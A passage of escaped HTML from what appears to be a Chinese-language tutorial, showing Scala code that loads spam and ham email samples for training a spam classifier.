&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
 def getFilesFromDir(path: String):List[File] = {
    val d = new File(path)
    if (d.exists &amp;amp;&amp;amp; d.isDirectory) {
      //Remove the mac os basic storage file, 
      //and alternatively for unix systems &quot;cmds&quot;
      //移除mac os的基本存储文件或者unix系统的“cmd”文件

      d .listFiles
        .filter(x =&amp;gt; x  .isFile &amp;amp;&amp;amp;
                     !x .toString
                        .contains(&quot;.DS_Store&quot;)  &amp;amp;&amp;amp;
                     !x .toString
                        .contains(&quot;cmds&quot;))
                        .toList
    } 
    else {
      List[File]()
    }
  }&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06133d945286289-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06133d945286289-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06133d945286289-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06133d945286289-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06133d945286289-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06133d945286289-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06133d945286289-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06133d945286289-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06133d945286289-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06133d945286289-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06133d945286289-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06133d945286289-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06133d945286289-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06133d945286289-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06133d945286289-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06133d945286289-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06133d945286289-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06133d945286289-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06133d945286289-19&quot;&gt;19&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06133d945286289-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getFilesFromDir&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06133d945286289-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06133d945286289-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;isDirectory&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06133d945286289-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Remove the mac os basic storage file, &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06133d945286289-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//and alternatively for unix systems &quot;cmds&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06133d945286289-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//移除mac os的基本存储文件或者unix系统的“cmd”文件&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06133d945286289-7&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06133d945286289-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;listFiles&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06133d945286289-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;isFile&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06133d945286289-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                     &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toString&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06133d945286289-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;.DS_Store&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06133d945286289-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                     &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toString&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06133d945286289-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;cmds&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06133d945286289-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06133d945286289-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06133d945286289-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06133d945286289-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06133d945286289-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06133d945286289-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0027 seconds] --&gt;
&lt;p&gt;然后，我们要定义一组路径，它们可以方便我们从案例数据中加载不同的数据集。与此同时，我们也直接定义一组大小为 500 的样本，这是垃圾邮件训练集的总数。为了让训练集在两种分类上保持平衡，我们把正常邮件的样本总数也定为 500。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061341372596984&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
def main(args: Array[String]): Unit = {
    val basePath = &quot;/Users/../Downloads/data&quot;
    val spamPath = basePath + &quot;/spam&quot;
    val spam2Path = basePath + &quot;/spam_2&quot;
    val easyHamPath = basePath + &quot;/easy_ham&quot;
    val easyHam2Path = basePath + &quot;/easy_ham_2&quot;

    val amountOfSamplesPerSet = 500
    val amountOfFeaturesToTake = 100
    //First get a subset of the filenames for the spam 
    // sample set (500 is the complete set in this case)
    //首先取出一个包含文件名的子集作为垃圾邮件样本集（在这个案例中，全集是500个文件名）
    val listOfSpamFiles =   getFilesFromDir(spamPath)
        .take(amountOfSamplesPerSet)
    //Then get the messages that are contained in these files
    //然后取得包含在这些文件中的信息
    val spamMails = listOfSpamFiles.map(x =&amp;gt; (x, getMessage(x)))

     //Get a subset of the filenames from the ham sample set
     //取出一个文件名子集作为正常邮件样本集
     // (note that in this case it is not necessary to randomly
     // sample as the emails are already randomly ordered)
     //（注意在本案例中没有必要随机取样，因为这些邮件已经是随机排序）

    val listOfHamFiles =   getFilesFromDir(easyHamPath)
        .take(amountOfSamplesPerSet)
    //Get the messages that are contained in the ham files
    //取得包含在正常邮件中的信息
    val hamMails  = listOfHamFiles
        .map{x =&amp;gt; (x,getMessage(x)) }
  }&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061341372596984-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061341372596984-31&quot;&gt;31&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Unit&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/Users/../Downloads/data&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spamPath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/spam&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spam2Path&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/spam_2&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;easyHamPath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/easy_ham&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-6&quot;&gt;
